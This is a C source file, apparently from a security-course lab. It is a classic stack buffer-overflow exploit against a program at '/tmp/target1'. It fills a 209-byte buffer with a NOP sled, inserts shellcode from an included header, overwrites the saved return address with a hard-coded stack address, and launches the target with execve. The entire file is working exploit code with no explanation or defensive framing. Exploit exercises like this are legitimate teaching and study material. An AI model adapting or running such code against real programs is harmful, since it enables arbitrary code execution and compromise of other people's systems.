#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];
  
  char buf[209]; // 200 buf + 4 stp + 4 ret addr + 1 null terminate
  memset(buf, 0x90, sizeof(buf));
  strncpy(buf+200-strlen(shellcode), shellcode, strlen(shellcode)); // shellcode
  strncpy(buf+204, "\xe0\xfc\xff\xbf", 4); // ret addr
  strncpy(buf+208, "\x00", 1); // null terminate
  
  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
